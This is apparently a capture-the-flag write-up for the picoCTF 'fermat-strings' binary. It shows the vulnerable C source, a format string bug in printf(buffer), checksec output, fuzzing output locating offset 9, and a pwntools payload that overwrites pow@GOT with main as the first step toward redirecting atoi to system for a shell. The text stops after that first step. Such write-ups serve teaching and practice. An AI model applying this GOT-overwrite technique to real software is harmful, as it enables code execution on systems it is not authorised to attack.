### fermat-strings

Download the files `cat chall.c`.

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <math.h>
 
 #define SIZE 0x100
 
 int main(void)
 {
   char A[SIZE];
   char B[SIZE];
 
   int a = 0;
   int b = 0;
 
   puts("Welcome to Fermat\\'s Last Theorem as a service");
 
   setbuf(stdout, NULL);
   setbuf(stdin, NULL);
   setbuf(stderr, NULL);
 
   printf("A: ");
   read(0, A, SIZE);
   printf("B: ");
   read(0, B, SIZE);
 
   A[strcspn(A, "\n")] = 0;
   B[strcspn(B, "\n")] = 0;
 
   a = atoi(A);
   b = atoi(B);
 
   if(a == 0 || b == 0) {
     puts("Error: could not parse numbers!");
     return 1;
   }
 
   char buffer[SIZE];
   snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
   printf(buffer);
 
   int answer = -1;
   for(int i = 0; i < 100; i++) {
     if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
       answer = i;
     }
   }
 
   if(answer != -1) printf("Found the answer: %d\n", answer);
 }
 ```

The bug is obvious, there is a `format string vulnerability`. 

```c
char buffer[SIZE];
snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
printf(buffer);
```

The problem is, we do not have a buffer overflow to redirect back to main.

It's not possible to leak a `libc` address, overwrite a function and call `system` in one run, so we need to find another way to do it.

```bash
gef➤  checksec
[+] checksec for '/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/fermat-strings/chall'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

As we can see, `PIE` is disabled and also `RelRO` is `Partial`. That means we can overwrite `GOT` addresses. It's not possible to leak a `libc` address, overwrite a data and call `system` in one run, so we need to find another way to do it.

The exploitation process path is to:

* overwrite `pow@GOT` with `main` so we can trigger the `fsb` multiple times.
* leak a `libc` address.
* overwrite `atoi@GOT` with `system@GOT`, so when `atoi` is called, it will call `system()` and we can pass it as argument `"/bin/sh"`.

First, we need to see the offset where we write to. To pass the comparison, we need to add some look-alike numbers.

```c
  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }
```

We see that after it finds the first number, it prints the addresses.

```bash
➜  fermat-strings git:(main) ✗ ./chall    
Welcome to Fermat\'s Last Theorem as a service
A: 1%p
B: 2%p
Calculating for A: 10x400bd8 and B: 2(nil)
```

Also, the `SIZE` variable is `0x100` which gives us enough space to fuzz the right addresses. We send `99999999` and the `%p` format specifier to see at which offset we write.

```bash
➜  fermat-strings git:(main) ✗ python solver.py
[+] Starting local process './chall': pid 27256
b"Welcome to Fermat\\'s Last Theorem as a service\nA: B: Calculating for A: 999999990x400bd8(nil)0x10x7fd11e7d14600x7ffd53b444800x4008370x7fd11ea42dae(nil)0x105f5e0ff0x39393939393939390x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025(nil)(nil)(nil)(nil)(nil)(nil)0x31(nil)0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0xd98(nil)0x60(nil)0x1(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x80000x18000000x18000000x20000x80000x400x74616c75636c61430x20726f6620676e690x3939393939203a410x25702570253939390x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x2570257025702570 and B: 1\n"
[*] Process './chall' stopped with exit code 0 (pid 27256)
➜  fermat-strings git:(main) ✗ python
Python 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(ord('9'))
'0x39'
```

We can see that we write at `9`. Our aim now is to overwrite the address of `pow` with `main`. 

```python
writes = {e.got.pow : e.sym.main}
r.sendline(fmtstr_payload(9, writes))
```





 







